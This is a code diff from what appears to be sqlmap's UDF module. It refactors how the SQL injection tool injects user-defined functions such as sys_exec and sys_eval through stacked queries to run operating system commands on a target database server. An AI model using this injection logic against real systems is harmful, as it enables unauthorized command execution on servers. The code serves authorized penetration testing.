@@ -35,6 +35,7 @@ from lib.core.dump import dumper
 from lib.core.exception import sqlmapFilePathException
 from lib.core.exception import sqlmapMissingMandatoryOptionException
 from lib.core.exception import sqlmapUnsupportedFeatureException
+from lib.core.unescaper import unescaper
 from lib.request import inject
 from lib.techniques.outband.stacked import stackedTest
 
@@ -89,20 +90,22 @@ class UDF:
         self.createSupportTbl(self.cmdTblName, self.tblField, dataType)
 
     def udfExecCmd(self, cmd, silent=False, udfName=None):
-        cmd = urlencode(cmd, convall=True)
-
         if udfName is None:
             cmd     = "'%s'" % cmd
             udfName = "sys_exec"
 
+        cmd = unescaper.unescape(cmd)
+        cmd = urlencode(cmd, convall=True)
+
         inject.goStacked("SELECT %s(%s)" % (udfName, cmd), silent)
 
     def udfEvalCmd(self, cmd, first=None, last=None, udfName=None):
-        cmd = urlencode(cmd, convall=True)
-
         if udfName is None:
             cmd     = "'%s'" % cmd
             udfName = "sys_eval"
+
+        cmd = unescaper.unescape(cmd)
+        cmd = urlencode(cmd, convall=True)
 
         inject.goStacked("INSERT INTO %s(%s) VALUES (%s(%s))" % (self.cmdTblName, self.tblField, udfName, cmd))
         output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, firstChar=first, lastChar=last)
@@ -116,23 +119,29 @@ class UDF:
 
         return output
 
-    def checkNeededUdfs(self):
+    def udfCheckNeeded(self):
+        if ( not conf.rFile or ( conf.rFile and kb.dbms != "PostgreSQL" ) ) and "sys_fileread" in self.sysUdfs:
+            self.sysUdfs.pop("sys_fileread")
+
         if not conf.osPwn:
             self.sysUdfs.pop("sys_bineval")
 
         if not conf.osCmd and not conf.osShell and not conf.regRead:
             self.sysUdfs.pop("sys_eval")
 
-    def udfCreateFromSharedLib(self):
-        errMsg = "udfSetRemotePath() method must be defined within the plugin"
-        raise sqlmapUnsupportedFeatureException(errMsg)
+            if not conf.osPwn and not conf.regAdd and not conf.regDel:
+                self.sysUdfs.pop("sys_exec")
 
     def udfSetRemotePath(self):
         errMsg = "udfSetRemotePath() method must be defined within the plugin"
         raise sqlmapUnsupportedFeatureException(errMsg)
 
-    def udfInjectCmd(self):
-        errMsg = "udfInjectCmd() method must be defined within the plugin"
+    def udfSetLocalPaths(self):
+        errMsg = "udfSetLocalPaths() method must be defined within the plugin"
+        raise sqlmapUnsupportedFeatureException(errMsg)
+
+    def udfCreateFromSharedLib(self):
+        errMsg = "udfSetRemotePath() method must be defined within the plugin"
         raise sqlmapUnsupportedFeatureException(errMsg)
 
     def udfInjectCore(self, udfDict):
@@ -156,6 +165,11 @@ class UDF:
             supportTblType = "text"
 
         self.udfCreateSupportTbl(supportTblType)
+
+    def udfInjectSys(self):
+        self.udfSetLocalPaths()
+        self.udfCheckNeeded()
+        self.udfInjectCore(self.sysUdfs)
 
     def udfInjectCustom(self):
         if kb.dbms not in ( "MySQL", "PostgreSQL" ):
@@ -286,7 +300,6 @@ class UDF:
 
                 if isinstance(retType, str) and retType.isdigit():
                     logger.warn("you need to specify the data-type of the return value")
-
                 else:
                     self.udfs[udfName]["return"] = retType
                     break
@@ -314,16 +327,13 @@ class UDF:
             while True:
                 choice = readInput(msg)
 
-                if choice[0] in ( "q", "Q" ):
+                if choice and choice[0] in ( "q", "Q" ):
                     break
-
-                if isinstance(choice, str) and choice.isdigit() and int(choice) > 0 and int(choice) <= len(udfList):
+                elif isinstance(choice, str) and choice.isdigit() and int(choice) > 0 and int(choice) <= len(udfList):
                     choice = int(choice)
                     break
-
                 elif isinstance(choice, int) and choice > 0 and choice <= len(udfList):
                     break
-
                 else:
                     warnMsg  = "invalid value, only digits >= 1 and "
                     warnMsg += "<= %d are allowed" % len(udfList)
